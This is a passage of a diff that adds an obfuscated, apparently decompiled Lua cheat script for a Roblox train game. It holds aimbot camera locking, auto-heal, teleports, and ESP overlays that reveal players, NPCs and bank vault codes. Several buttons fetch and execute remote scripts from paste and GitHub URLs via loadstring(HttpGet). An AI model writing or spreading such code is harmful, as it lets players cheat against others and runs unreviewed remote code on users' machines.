+                            end
+                            break
+                        end
+                        local v160 = (vu36.Character.HumanoidRootPart.Position - v159.HumanoidRootPart.Position).Magnitude
+                        if v160 < v155 then
+                            local v161 = true
+                            local v162 = vu33.NoModsCombatFilterDropdown and vu33.NoModsCombatFilterDropdown.Value or {}
+                            if v162.Horse and (v159.Name:find("Horse") or v159.Name:find("Unicorn")) or (v162.Wolf and v159.Name:find("Wolf") or v162.Werewolf and v159.Name:find("Werewolf")) then
+                                v161 = false
+                            elseif v159.Name:find("Soldier") then
+                                v161 = false
+                            end
+                            if v161 then
+                                v156 = v159:FindFirstChild(_G.CharacterMods or "Head")
+                                v155 = v160
+                                v157 = v159
+                            end
+                        end
+                    end
+                    if v156 and v157 then
+                        vu38.CurrentCamera.CFrame = CFrame.lookAt(vu38.CurrentCamera.CFrame.Position, v156.Position + Vector3.new(0, v156.Size.Y * 0.3, 0))
+                        if _G.HealthBarMods and vu154 then
+                            vu154.Enabled = true
+                            if vu154:FindFirstChild("Frame") and v157:FindFirstChild("Humanoid") then
+                                local v163 = vu154.Frame
+                                local v164 = v157.Humanoid
+                                local v165 = v163:FindFirstChild("InfoText")
+                                if v165 then
+                                    v165.Text = v157.Name:gsub("Model_", "") .. " HP: " .. string.format("%.0f", v164.Health) .. "/" .. v164.MaxHealth
+                                end
+                                local v166 = v163:FindFirstChild("HealthBarActual")
+                                if v166 then
+                                    v166.Size = UDim2.new(v164.Health / v164.MaxHealth, 0, 1, 0)
+                                end
+                            end
+                        end
+                    elseif _G.HealthBarMods and (vu154 and vu154.Enabled) then
+                        vu154.Enabled = false
+                    end
+                end
+            end
+        end)
+    else
+        vu153 = false
+        if _G.HealthBarMods and (vu154 and vu154.Enabled) then
+            vu154.Enabled = false
+        end
+    end
+end)
+local v167 = vu42:AddToggle("CamlockModsToggle", {
+    Title = "Camlock Mods",
+    Default = false,
+    Keybind = Enum.KeyCode.K
+})
+local vu168 = false
+v167:OnChanged(function()
+    _G.CamlockMods = vu33.CamlockModsToggle.Value
+    local vu169 = game.CoreGui:FindFirstChild("Gun Health Track")
+    if _G.CamlockMods then
+        vu168 = true
+        task.spawn(function()
+            while true do
+                if not (_G.CamlockMods and (vu168 and task.wait())) then
+                    vu168 = false
+                    if not _G.CamlockMods then
+                        if vu36.Character and (vu36.Character:FindFirstChild("Humanoid") and vu38.CurrentCamera.CameraSubject ~= vu36.Character.Humanoid) then
+                            vu38.CurrentCamera.CameraSubject = vu36.Character.Humanoid
+                        end
+                        if vu36.Character and vu36.Character:FindFirstChild("Esp_LocalPlayerHighlight_Camlock") then
+                            vu36.Character.Esp_LocalPlayerHighlight_Camlock:Destroy()
+                        end
+                        if _G.HealthBarMods and (vu169 and vu169.Enabled) then
+                            vu169.Enabled = false
+                        end
+                    end
+                    return
+                end
+                if vu36.Character and (vu36.Character:FindFirstChild("HumanoidRootPart") and vu38.CurrentCamera) then
+                    local v170 = math.huge
+                    local v171 = nil
+                    local v172 = nil
+                    for v173 = # _G.KillAuraGun_ModsAntilag, 1, - 1 do
+                        local v174 = _G.KillAuraGun_ModsAntilag[v173]
+                        if not v174 or (not v174.Parent or (not v174:FindFirstChild("HumanoidRootPart") or (not v174:FindFirstChild("Humanoid") or (not v174:FindFirstChild("Head") or v174.Humanoid.Health <= 0)))) then
+                            if _G.KillAuraGun_ModsAntilag[v173] == v174 then
+                                table.remove(_G.KillAuraGun_ModsAntilag, v173)
+                            end
+                            break
+                        end
+                        local v175 = (vu36.Character.HumanoidRootPart.Position - v174.HumanoidRootPart.Position).Magnitude
+                        if v175 < v170 then
+                            local v176 = true
+                            local v177 = vu33.NoModsCombatFilterDropdown and vu33.NoModsCombatFilterDropdown.Value or {}
+                            if v177.Horse and (v174.Name:find("Horse") or v174.Name:find("Unicorn")) or (v177.Wolf and v174.Name:find("Wolf") or v177.Werewolf and v174.Name:find("Werewolf")) then
+                                v176 = false
+                            elseif v174.Name:find("Soldier") then
+                                v176 = false
+                            end
+                            if v176 then
+                                v171 = v174:FindFirstChild(_G.CharacterMods or "Head")
+                                v170 = v175
+                                v172 = v174
+                            end
+                        end
+                    end
+                    if v171 and v172 then
+                        if vu38.CurrentCamera.CameraSubject ~= v171 then
+                            vu38.CurrentCamera.CameraSubject = v171
+                        end
+                        if vu36.Character and not vu36.Character:FindFirstChild("Esp_LocalPlayerHighlight_Camlock") then
+                            local v178 = Instance.new("Highlight", vu36.Character)
+                            v178.Name = "Esp_LocalPlayerHighlight_Camlock"
+                            v178.FillColor = Color3.fromRGB(0, 255, 0)
+                            v178.OutlineColor = Color3.fromRGB(255, 255, 255)
+                            v178.FillTransparency = 0.7
+                            v178.OutlineTransparency = 0.3
+                            v178.Adornee = vu36.Character
+                        end
+                        if _G.HealthBarMods and vu169 then
+                            vu169.Enabled = true
+                            if vu169:FindFirstChild("Frame") and v172:FindFirstChild("Humanoid") then
+                                local v179 = vu169.Frame
+                                local v180 = v172.Humanoid
+                                local v181 = v179:FindFirstChild("InfoText")
+                                if v181 then
+                                    v181.Text = v172.Name:gsub("Model_", "") .. " HP: " .. string.format("%.0f", v180.Health) .. "/" .. v180.MaxHealth
+                                end
+                                local v182 = v179:FindFirstChild("HealthBarActual")
+                                if v182 then
+                                    v182.Size = UDim2.new(v180.Health / v180.MaxHealth, 0, 1, 0)
+                                end
+                            end
+                        end
+                    else
+                        if vu36.Character and (vu36.Character:FindFirstChild("Humanoid") and vu38.CurrentCamera.CameraSubject ~= vu36.Character.Humanoid) then
+                            vu38.CurrentCamera.CameraSubject = vu36.Character.Humanoid
+                        end
+                        if vu36.Character and vu36.Character:FindFirstChild("Esp_LocalPlayerHighlight_Camlock") then
+                            vu36.Character.Esp_LocalPlayerHighlight_Camlock:Destroy()
+                        end
+                        if _G.HealthBarMods and (vu169 and vu169.Enabled) then
+                            vu169.Enabled = false
+                        end
+                    end
+                end
+            end
+        end)
+    else
+        vu168 = false
+        if vu36.Character and (vu36.Character:FindFirstChild("Humanoid") and vu38.CurrentCamera.CameraSubject ~= vu36.Character.Humanoid) then
+            vu38.CurrentCamera.CameraSubject = vu36.Character.Humanoid
+        end
+        if vu36.Character and vu36.Character:FindFirstChild("Esp_LocalPlayerHighlight_Camlock") then
+            vu36.Character.Esp_LocalPlayerHighlight_Camlock:Destroy()
+        end
+        if _G.HealthBarMods and (vu169 and vu169.Enabled) then
+            vu169.Enabled = false
+        end
+    end
+end)
+vu42:AddSlider("AutoHealHealthThresholdSlider", {
+    Title = "Auto Heal Threshold",
+    Min = 1,
+    Max = 100,
+    Default = 68,
+    Rounding = 0,
+    Suffix = "% HP",
+    Callback = function(_)
+        _G.HealthyHeal = vu33.AutoHealHealthThresholdSlider.Value
+    end
+})
+vu42:AddToggle("AutoHealToggle", {
+    Title = "Auto Heal",
+    Default = false
+}):OnChanged(function()
+    _G.AutoHeal = vu33.AutoHealToggle.Value
+    if _G.AutoHeal then
+        task.spawn(function()
+            while _G.AutoHeal and task.wait(0.2) do
+                if vu36.Character and (vu36.Character:FindFirstChild("Humanoid") and vu36.Character.Humanoid.Health < (_G.HealthyHeal or 68)) then
+                    local v183 = not vu36.Backpack:FindFirstChild("Bandage") and vu36.Character
+                    if v183 then
+                        v183 = vu36.Character:FindFirstChild("Bandage")
+                    end
+                    if v183 and v183:FindFirstChild("Use") and v183.Use:IsA("RemoteEvent") then
+                        if v183.Parent == vu36.Backpack then
+                            v183.Parent = vu36.Character
+                            task.wait(0.1)
+                        end
+                        if v183.Parent == vu36.Character then
+                            pcall(v183.Use.FireServer, v183.Use)
+                            task.wait(0.5)
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+v43:AddButton({
+    Title = "Teleport to End 2",
+    Callback = function()
+        task.spawn(function()
+            local v184 = vu36.Character or vu36.CharacterAdded:Wait()
+            local v185 = v184:WaitForChild("Humanoid")
+            local v186 = v184:WaitForChild("HumanoidRootPart")
+            if v185 and v186 then
+                local v187 = v185.JumpPower
+                v186.CFrame = CFrame.new(- 424.40799, 28.1134377, - 49040.043)
+                v186.Anchored = true
+                v185.WalkSpeed = 0
+                v185.JumpPower = 0
+                local v188 = tick()
+                local v189 = 3
+                while tick() - v188 < v189 do
+                    v185:Move(v186.CFrame.LookVector, false)
+                    task.wait()
+                end
+                v185:Move(Vector3.zero, false)
+                task.wait(1.5)
+                v186.CFrame = v186.CFrame * CFrame.new(0.1, - 0.1, 0.1)
+                v186.Anchored = false
+                v185.WalkSpeed = 16
+                v185.JumpPower = v187
+                print("\196\144\195\163 d\225\187\139ch chuy\225\187\131n \196\145\225\186\191n End 2.")
+            else
+                print("L\225\187\151i TP: Kh\195\180ng t\195\172m th\225\186\165y nh\195\162n v\225\186\173t.")
+            end
+        end)
+    end
+})
+v43:AddButton({
+    Title = "TP Train",
+    Callback = function()
+        local v190 = workspace:FindFirstChild("default") or workspace:FindFirstChild("golden") or (workspace:FindFirstChild("cattle") or workspace:FindFirstChild("armor"))
+        local vu191 = not (v190 and v190:FindFirstChild("TrainControls", true) and v190.TrainControls:FindFirstChild("ConductorSeat", true)) and (v190 and v190:FindFirstChild("RequiredComponents", true) and v190.RequiredComponents:FindFirstChild("Controls", true))
+        if vu191 then
+            vu191 = v190.RequiredComponents.Controls:FindFirstChild("ConductorSeat", true)
+        end
+        if vu191 then
+            vu191 = vu191:FindFirstChild("VehicleSeat")
+        end
+        if vu191 then
+            local v194, v195 = pcall(function()
+                local v192 = vu36.Character
+                if v192 then
+                    v192 = vu36.Character:FindFirstChild("Humanoid")
+                end
+                local v193 = vu36.Character
+                if v193 then
+                    v193 = vu36.Character:FindFirstChild("HumanoidRootPart")
+                end
+                if not (v192 and v193) then
+                    warn("Nh\195\162n v\225\186\173t ho\225\186\183c Humanoid kh\195\180ng t\225\187\147n t\225\186\161i!")
+                    return false
+                end
+                v193.CFrame = vu191.CFrame * CFrame.new(0, 2, 0)
+                v192:Sit(vu191)
+                return true
+            end)
+            if not (v194 and v195) then
+                print("TP Train Error: ", v195)
+            end
+        else
+            print("Kh\195\180ng t\195\172m th\225\186\165y t\195\160u ho\225\186\183c gh\225\186\191 l\195\161i t\195\160u.")
+        end
+    end
+})
+local v196, v197, v198 = ipairs({
+    {
+        Title = "TP To Tesla",
+        Url = "https://raw.githubusercontent.com/XUANVNPRO/XUANVNPRO/refs/heads/main/nhincc.lua"
+    },
+    {
+        Title = "TP To Castle",
+        Url = "https://raw.githubusercontent.com/XUANVNPRO/XUANVNPRO/refs/heads/main/nhinccv2.lua.txt"
+    },
+    {
+        Title = "TP To Village Normal",
+        Url = "https://raw.githubusercontent.com/XUANVNPRO/XUANVNPRO/refs/heads/main/nhinccv3.lua.txt"
+    },
+    {
+        Title = "TP To Fort",
+        Url = "https://raw.githubusercontent.com/XUANVNPRO/XUANVNPRO/refs/heads/main/nhinccv4.lua.txt"
+    },
+    {
+        Title = "TP To Sterling",
+        Url = "https://hst.sh/raw/agudecaful"
+    }
+})
+local vu199 = vu36
+local v200 = vu35
+local vu201 = vu33
+while true do
+    local vu202
+    v198, vu202 = v196(v197, v198)
+    if v198 == nil then
+        break
+    end
+    v43:AddButton({
+        Title = vu202.Title,
+        Callback = function()
+            pcall(function()
+                loadstring(game:HttpGet(vu202.Url))()
+            end)
+            print("\196\144ang th\225\187\177c thi script " .. vu202.Title)
+        end
+    })
+end
+vu44:AddParagraph({
+    Title = "L\198\176u \195\189 quan tr\225\187\141ng",
+    Content = "Ch\225\187\137 b\225\186\173t l\195\186c v\195\160o game ch\195\173nh, khi b\225\186\173t h\195\163y t\225\186\175t t\225\186\165t c\225\186\163 ch\225\187\169c n\196\131ng kh\195\161c.\nOnly turn on when entering the main game, when turned on, please turn off all other functions."
+})
+vu44:AddToggle("AutoBondEnabled", {
+    Title = "Auto Bond (Original)",
+    Default = false
+}):OnChanged(function()
+    local v203 = vu201.AutoBondEnabled.Value
+    getgenv().Loop = v203
+    if v203 then
+        pcall(function()
+            loadstring(game:HttpGet("https://hst.sh/raw/ufowonutah"))()
+        end)
+        print("Auto Bond (Original): ON")
+    else
+        print("Auto Bond (Original): OFF")
+    end
+end)
+vu44:AddToggle("AutoBondV2Enabled", {
+    Title = "Farm Bond V2",
+    Default = false
+}):OnChanged(function()
+    if vu201.AutoBondV2Enabled.Value then
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/XUANVNPRO/Bondfarm/refs/heads/main/Bondv2"))()
+        end)
+        print("Farm Bond V2: ON")
+    else
+        print("Farm Bond V2: OFF (\196\145\195\163 c\225\187\145 g\225\186\175ng t\225\186\175t)")
+    end
+end)
+local v204, v205, v206 = ipairs({
+    {
+        Title = "10km",
+        Url = "https://hst.sh/raw/itiqeraxuc"
+    },
+    {
+        Title = "20km",
+        Url = "https://hst.sh/raw/jeyulayole"
+    },
+    {
+        Title = "30km",
+        Url = "https://hst.sh/raw/uwuqupejug"
+    },
+    {
+        Title = "40km",
+        Url = "https://hst.sh/raw/ilehoqinop"
+    },
+    {
+        Title = "50km",
+        Url = "https://hst.sh/raw/ariroloyix"
+    },
+    {
+        Title = "60km",
+        Url = "https://hst.sh/raw/nusulosugu"
+    },
+    {
+        Title = "70km",
+        Url = "https://hst.sh/raw/tovomuluwi"
+    }
+})
+while true do
+    local vu207
+    v206, vu207 = v204(v205, v206)
+    if v206 == nil then
+        break
+    end
+    v45:AddButton({
+        Title = vu207.Title,
+        Callback = function()
+            pcall(function()
+                loadstring(game:HttpGet(vu207.Url))()
+            end)
+            print("\196\144ang th\225\187\177c thi script TP " .. vu207.Title)
+        end
+    })
+end
+_G.EspTrain = false
+_G.EspTimeEnabled = false
+_G.EspDistanceTrain = false
+_G.EspOrb = false
+_G.EspPlayer = false
+_G.ItemEspChoose = "Item"
+_G.EspItem = false
+_G.EspModsAntilag = {}
+_G.EspMods = false
+_G.EspBank = false
+_G.EspHighlight = false
+_G.ColorLight = Color3.fromRGB(255, 255, 255)
+_G.EspGui = false
+_G.EspGuiTextColor = Color3.fromRGB(255, 255, 255)
+_G.EspGuiTextSize = 15
+_G.EspName = false
+_G.EspDistance = false
+_G.EspHealth = false
+local function vu212(p208, p209, p210)
+    local v211 = p209:FindFirstChild("Esp_Highlight_" .. p210)
+    if vu201[p210] and (vu201[p210].Value and _G.EspHighlight) then
+        if not v211 then
+            v211 = Instance.new("Highlight")
+            v211.Name = "Esp_Highlight_" .. p210
+            v211.Adornee = p208
+            v211.Parent = p209
+        end
+        v211.Enabled = true
+        v211.FillColor = _G.ColorLight
+        v211.OutlineColor = _G.ColorLight
+        v211.FillTransparency = 0.5
+        v211.OutlineTransparency = 0
+    elseif v211 then
+        v211.Enabled = false
+    end
+end
+local function vu216(p213, p214)
+    local v215 = p213:FindFirstChild("Esp_Highlight_" .. p214)
+    if v215 then
+        v215:Destroy()
+    end
+end
+local function vu223(_, p217, p218, p219)
+    if p217 then
+        local v220 = p217:FindFirstChild("Esp_Gui_" .. p218)
+        if vu201[p218] and (vu201[p218].Value and _G.EspGui) then
+            if not v220 then
+                v220 = Instance.new("BillboardGui")
+                v220.Name = "Esp_Gui_" .. p218
+                v220.Adornee = p217
+                v220.Size = UDim2.new(0, 150, 0, 80)
+                v220.AlwaysOnTop = true
+                v220.StudsOffset = Vector3.new(0, 2.5, 0)
+                local v221 = Instance.new("TextLabel")
+                v221.Name = "InfoText"
+                v221.Size = UDim2.new(1, 0, 1, 0)
+                v221.BackgroundTransparency = 1
+                v221.Font = Enum.Font.SourceSansSemibold
+                v221.TextScaled = false
+                v221.Parent = v220
+                v220.Parent = p217
+            end
+            v220.Enabled = true
+            local v222 = v220:FindFirstChild("InfoText")
+            if v222 then
+                v222.Text = p219()
+                v222.TextSize = _G.EspGuiTextSize
+                v222.TextColor3 = _G.EspGuiTextColor
+                v222.TextStrokeTransparency = 0.3
+                v222.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            end
+        elseif v220 then
+            v220.Enabled = false
+        end
+    end
+end
+local function vu227(p224, p225)
+    if p224 then
+        local v226 = p224:FindFirstChild("Esp_Gui_" .. p225)
+        if v226 then
+            v226:Destroy()
+        end
+    end
+end
+vu46:AddToggle("EspTrainToggle_ESP", {
+    Title = "ESP Train",
+    Default = false
+}):OnChanged(function()
+    _G.EspTrain = vu201.EspTrainToggle_ESP.Value
+    if not _G.EspTrain then
+        local v228 = vu38
+        local v229, v230, v231 = pairs(v228:GetChildren())
+        while true do
+            local v232
+            v231, v232 = v229(v230, v231)
+            if v231 == nil then
+                break
+            end
+            if v232:IsA("Model") and v232:FindFirstChild("RequiredComponents") then
+                vu216(v232, "EspTrainToggle_ESP")
+                local v233 = v232.RequiredComponents:FindFirstChild("Controls", true)
+                if v233 then
+                    v233 = v232.RequiredComponents.Controls:FindFirstChild("ConductorSeat", true)
+                end
+                if v233 then
+                    v233 = v233:FindFirstChild("VehicleSeat")
+                end
+                if v233 then
+                    vu227(v233, "EspTrainToggle_ESP")
+                end
+            end
+        end
+    end
+end)
+v200.RenderStepped:Connect(function()
+    if _G.EspTrain and vu199.Character and vu199.Character:FindFirstChild("HumanoidRootPart") then
+        local v234 = vu38
+        local v235, v236, v237 = pairs(v234:GetChildren())
+        while true do
+            local v238
+            v237, v238 = v235(v236, v237)
+            if v237 == nil then
+                break
+            end
+            local v239 = v238:IsA("Model")
+            if v239 then
+                v239 = v238:FindFirstChild("RequiredComponents")
+            end
+            if v239 then
+                local vu240 = v239:FindFirstChild("Controls")
+                if vu240 then
+                    local v241 = vu240:FindFirstChild("ConductorSeat")
+                    if v241 then
+                        local vu242 = v241:FindFirstChild("VehicleSeat")
+                        if vu242 then
+                            vu212(v238, v238, "EspTrainToggle_ESP")
+                            vu223(v238, vu242, "EspTrainToggle_ESP", function()
+                                local v243 = ""
+                                if _G.EspName then
+                                    v243 = v243 .. "Train\n"
+                                end
+                                if _G.EspDistance then
+                                    v243 = v243 .. string.format("Dist: %.1fm\n", (vu199.Character.HumanoidRootPart.Position - vu242.Position).Magnitude)
+                                end
+                                local v244 = vu240:FindFirstChild("DistanceDial")
+                                if _G.EspDistanceTrain and (v244 and v244:FindFirstChild("SurfaceGui")) and v244.SurfaceGui:FindFirstChild("TextLabel") then
+                                    v243 = v243 .. "Train Dist: " .. v244.SurfaceGui.TextLabel.Text .. "\n"
+                                end
+                                if _G.EspTimeEnabled and vu34:FindFirstChild("TimeHour") then
+                                    v243 = v243 .. "Time: " .. vu34.TimeHour.Value
+                                end
+                                return v243
+                            end)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+vu46:AddToggle("EspOreToggle_ESP", {
+    Title = "ESP Ore",
+    Default = false
+}):OnChanged(function()
+    _G.EspOrb = vu201.EspOreToggle_ESP.Value
+    if not _G.EspOrb and vu38:FindFirstChild("Ore") then
+        local v245, v246, v247 = pairs(vu38.Ore:GetChildren())
+        while true do
+            local v248
+            v247, v248 = v245(v246, v247)
+            if v247 == nil then
+                break
+            end
+            if v248:IsA("Model") and v248:FindFirstChild("Boulder_a") then
+                vu216(v248.Boulder_a, "EspOreToggle_ESP")
+                vu227(v248.Boulder_a, "EspOreToggle_ESP")
+            end
+        end
+    end
+end)
+v200.RenderStepped:Connect(function()
+    if _G.EspOrb and (vu38:FindFirstChild("Ore") and vu199.Character and vu199.Character:FindFirstChild("HumanoidRootPart")) then
+        local v249, v250, v251 = pairs(vu38.Ore:GetChildren())
+        while true do
+            local vu252
+            v251, vu252 = v249(v250, v251)
+            if v251 == nil then
+                break
+            end
+            if vu252:IsA("Model") and (vu252:FindFirstChild("Health") and vu252:FindFirstChild("Boulder_a")) then
+                vu212(vu252.Boulder_a, vu252.Boulder_a, "EspOreToggle_ESP")
+                vu223(vu252, vu252.Boulder_a, "EspOreToggle_ESP", function()
+                    local v253 = ""
+                    if _G.EspName then
+                        v253 = v253 .. vu252.Name .. "\n"
+                    end
+                    if _G.EspDistance then
+                        v253 = v253 .. string.format("Dist: %.1fm\n", (vu199.Character.HumanoidRootPart.Position - vu252.Boulder_a.Position).Magnitude)
+                    end
+                    if _G.EspHealth then
+                        v253 = v253 .. "HP: " .. vu252.Health.Value
+                    end
+                    return v253
+                end)
+            end
+        end
+    end
+end)
+vu46:AddToggle("EspPlayerToggle_ESP", {
+    Title = "ESP Player",
+    Default = false
+}):OnChanged(function()
+    _G.EspPlayer = vu201.EspPlayerToggle_ESP.Value
+    if not _G.EspPlayer then
+        local v254 = vu19
+        local v255, v256, v257 = pairs(v254:GetPlayers())
+        while true do
+            local v258
+            v257, v258 = v255(v256, v257)
+            if v257 == nil then
+                break
+            end
+            if v258.Character then
+                vu216(v258.Character, "EspPlayerToggle_ESP")
+                if v258.Character:FindFirstChild("Head") then
+                    vu227(v258.Character.Head, "EspPlayerToggle_ESP")
+                end
+            end
+        end
+    end
+end)
+v200.RenderStepped:Connect(function()
+    if _G.EspPlayer and vu199.Character and vu199.Character:FindFirstChild("HumanoidRootPart") then
+        local v259 = vu19
+        local v260, v261, v262 = pairs(v259:GetPlayers())
+        while true do
+            local vu263
+            v262, vu263 = v260(v261, v262)
+            if v262 == nil then
+                break
+            end
+            if vu263 ~= vu199 and vu263.Character and (vu263.Character:FindFirstChild("Head") and (vu263.Character:FindFirstChild("HumanoidRootPart") and vu263.Character:FindFirstChild("Humanoid"))) then
+                vu212(vu263.Character, vu263.Character, "EspPlayerToggle_ESP")
+                vu223(vu263.Character, vu263.Character.Head, "EspPlayerToggle_ESP", function()
+                    local v264 = ""
+                    if _G.EspName then
+                        v264 = v264 .. vu263.Name .. "\n"
+                    end
+                    if _G.EspDistance then
+                        v264 = v264 .. string.format("Dist: %.1fm\n", (vu199.Character.HumanoidRootPart.Position - vu263.Character.HumanoidRootPart.Position).Magnitude)
+                    end
+                    if _G.EspHealth then
+                        v264 = v264 .. string.format("HP: %.0f", vu263.Character.Humanoid.Health)
+                    end
+                    return v264
+                end)
+            end
+        end
+    end
+end)
+vu46:AddDropdown("ItemEspChooseDropdown_ESP", {
+    Title = "ESP Item Type",
+    Default = "Item",
+    Values = {
+        "Item",
+        "House"
+    }
+}):OnChanged(function()
+    _G.ItemEspChoose = vu201.ItemEspChooseDropdown_ESP.Value
+end)
+vu46:AddToggle("EspItemToggle_ESP", {
+    Title = "ESP Item/House",
+    Default = false
+}):OnChanged(function()
+    _G.EspItem = vu201.EspItemToggle_ESP.Value
+    local function v271(p265, p266)
+        if p265 then
+            local v267, v268, v269 = pairs(p265:GetChildren())
+            while true do
+                local v270
+                v269, v270 = v267(v268, v269)
+                if v269 == nil then
+                    break
+                end
+                if v270:IsA("Model") then
+                    vu216(v270, "EspItemToggle_ESP" .. p266)
+                    vu227(v270.PrimaryPart or v270, "EspItemToggle_ESP" .. p266)
+                end
+            end
+        end
+    end
+    if not _G.EspItem then
+        v271(vu38:FindFirstChild("RuntimeItems"), "Runtime")
+        v271(vu38:FindFirstChild("RandomBuildings"), "Building")
+    end
+end)
+v200.RenderStepped:Connect(function()
+    if _G.EspItem and vu199.Character and vu199.Character:FindFirstChild("HumanoidRootPart") then
+        if _G.ItemEspChoose ~= "House" or not vu38:FindFirstChild("RandomBuildings") then
+            if _G.ItemEspChoose == "Item" and vu38:FindFirstChild("RuntimeItems") then
+                local v272, v273, v274 = pairs(vu38.RuntimeItems:GetChildren())
+                while true do
+                    local vu275
+                    v274, vu275 = v272(v273, v274)
+                    if v274 == nil then
+                        break
+                    end
+                    if vu275:IsA("Model") and not vu275:FindFirstChild("HumanoidRootPart") then
+                        vu212(vu275, vu275, "EspItemToggle_ESPRuntime")
+                        vu223(vu275, vu275.PrimaryPart or vu275, "EspItemToggle_ESPRuntime", function()
+                            local v276 = ""
+                            if _G.EspName then
+                                v276 = v276 .. vu275.Name .. "\n"
+                            end
+                            if _G.EspDistance and vu275.PrimaryPart then
+                                v276 = v276 .. string.format("Dist: %.1fm", (vu199.Character.HumanoidRootPart.Position - vu275.PrimaryPart.Position).Magnitude)
+                            end
+                            return v276
+                        end)
+                    end
+                end
+            end
+        else
+            local v277, v278, v279 = pairs(vu38.RandomBuildings:GetChildren())
+            while true do
+                local vu280
+                v279, vu280 = v277(v278, v279)
+                if v279 == nil then
+                    break
+                end
+                if vu280:IsA("Model") then
+                    vu223(vu280, vu280.PrimaryPart or vu280, "EspItemToggle_ESPBuilding", function()
+                        local v281 = ""
+                        if _G.EspName then
+                            v281 = v281 .. vu280.Name .. "\n"
+                        end
+                        if _G.EspDistance and vu280.PrimaryPart then
+                            v281 = v281 .. string.format("Dist: %.1fm", (vu199.Character.HumanoidRootPart.Position - vu280.PrimaryPart.Position).Magnitude)
+                        end
+                        return v281
+                    end)
+                end
+            end
+        end
+    end
+end)
+vu38.DescendantAdded:Connect(function(p282)
+    if p282:IsA("Model") and (p282:FindFirstChild("HumanoidRootPart") and p282:FindFirstChild("Humanoid")) and (not vu19:GetPlayerFromCharacter(p282) and (p282.Humanoid.Health > 0 and not table.find(_G.EspModsAntilag, p282))) then
+        table.insert(_G.EspModsAntilag, p282)
+    end
+end)
+vu38.DescendantRemoving:Connect(function(p283)
+    local v284 = table.find(_G.EspModsAntilag, p283)
+    if v284 then
+        table.remove(_G.EspModsAntilag, v284)
+    end
+end)
+vu46:AddToggle("EspModsToggle_ESP", {
+    Title = "ESP Mods/NPCs",
+    Default = false
+}):OnChanged(function()
+    _G.EspMods = vu201.EspModsToggle_ESP.Value
+    if not _G.EspMods then
+        local v285, v286, v287 = pairs(_G.EspModsAntilag)
+        while true do
+            local v288
+            v287, v288 = v285(v286, v287)
+            if v287 == nil then
+                break
+            end
+            if v288 and v288.Parent then
+                vu216(v288, "EspModsToggle_ESP")
+                if v288:FindFirstChild("HumanoidRootPart") then
+                    vu227(v288.HumanoidRootPart, "EspModsToggle_ESP")
+                end
+            end
+        end
+    end
+end)
+v200.RenderStepped:Connect(function()
+    if _G.EspMods and vu199.Character and vu199.Character:FindFirstChild("HumanoidRootPart") then
+        for v289 = # _G.EspModsAntilag, 1, - 1 do
+            local vu290 = _G.EspModsAntilag[v289]
+            if vu290 and (vu290.Parent and (vu290:FindFirstChild("HumanoidRootPart") and (vu290:FindFirstChild("Humanoid") and vu290.Humanoid.Health > 0))) then
+                vu212(vu290, vu290, "EspModsToggle_ESP")
+                vu223(vu290, vu290.HumanoidRootPart, "EspModsToggle_ESP", function()
+                    local v291 = ""
+                    if _G.EspName then
+                        v291 = v291 .. vu290.Name:gsub("Model_", "") .. "\n"
+                    end
+                    if _G.EspDistance then
+                        v291 = v291 .. string.format("Dist: %.1fm\n", (vu199.Character.HumanoidRootPart.Position - vu290.HumanoidRootPart.Position).Magnitude)
+                    end
+                    if _G.EspHealth then
+                        v291 = v291 .. string.format("HP: %.0f", vu290.Humanoid.Health)
+                    end
+                    return v291
+                end)
+            else
+                if vu290 and vu290.Parent then
+                    vu216(vu290, "EspModsToggle_ESP")
+                    if vu290:FindFirstChild("HumanoidRootPart") then
+                        vu227(vu290.HumanoidRootPart, "EspModsToggle_ESP")
+                    end
+                end
+                if _G.EspModsAntilag[v289] == vu290 then
+                    table.remove(_G.EspModsAntilag, v289)
+                end
+            end
+        end
+    end
+end)
+local function vu295(pu292)
+    if pu292:FindFirstChild("Vault") and (pu292.Vault:FindFirstChild("Union") and pu292.Vault:FindFirstChild("Combination")) then
+        local vu293 = pu292.Vault.Union
+        vu212(vu293, vu293, "EspBankToggle_ESP" .. pu292:GetFullName():gsub("[^%w]", ""))
+        vu223(pu292, vu293, "EspBankToggle_ESP" .. pu292:GetFullName():gsub("[^%w]", ""), function()
+            local v294 = "Bank | " .. pu292.Vault.Combination.Value .. "\n"
+            if _G.EspDistance then
+                v294 = v294 .. string.format("Dist: %.1fm", (vu199.Character.HumanoidRootPart.Position - vu293.Position).Magnitude)
+            end
+            return v294
+        end)
+    end
+end
+vu46:AddToggle("EspBankToggle_ESP", {
+    Title = "ESP Bank/Code",
+    Default = false
+}):OnChanged(function()
+    _G.EspBank = vu201.EspBankToggle_ESP.Value
+    local function v301(p296)
+        if p296 then
+            local v297, v298, v299 = pairs(p296:GetDescendants())
+            while true do
+                local v300
+                v299, v300 = v297(v298, v299)
+                if v299 == nil then
+                    break
+                end
+                if v300.Name and (v300.Name:find("Bank") and (v300:IsA("Model") and v300:FindFirstChild("Vault")) and v300.Vault:FindFirstChild("Union")) then
+                    vu216(v300.Vault.Union, "EspBankToggle_ESP" .. v300:GetFullName():gsub("[^%w]", ""))
+                    vu227(v300.Vault.Union, "EspBankToggle_ESP" .. v300:GetFullName():gsub("[^%w]", ""))
+                end
+            end
+        end
+    end
+    if not _G.EspBank then
+        v301(vu38:FindFirstChild("Towns"))
+        v301(vu38:FindFirstChild("Sterling"))
+    end
+end)
+v200.RenderStepped:Connect(function()
+    if _G.EspBank and vu199.Character and vu199.Character:FindFirstChild("HumanoidRootPart") then
+        local function v307(p302)
+            if p302 then
+                local v303, v304, v305 = pairs(p302:GetDescendants())
+                while true do
+                    local v306
+                    v305, v306 = v303(v304, v305)
+                    if v305 == nil then
+                        break
+                    end
+                    if v306.Name and (v306.Name:find("Bank") and v306:IsA("Model")) then
+                        vu295(v306)
+                    end
+                end
+            end
+        end
+        v307(vu38:FindFirstChild("Towns"))
+        v307(vu38:FindFirstChild("Sterling"))
+    end
+end)
+vu47:AddToggle("EnableEspHighlightToggle_ESPDisplay", {
+    Title = "Enable ESP Highlight",
+    Default = false
+}):OnChanged(function()
+    _G.EspHighlight = vu201.EnableEspHighlightToggle_ESPDisplay.Value
+end)
+local vu308 = vu47:AddInput("HighlightColorInput_ESPDisplay", {
+    Title = "Highlight Color (R,G,B)",
+    PlaceholderText = "255,255,255",
+    Default = "255,255,255"
+})
+local v309 = vu308
+vu308.OnChanged(v309, function()
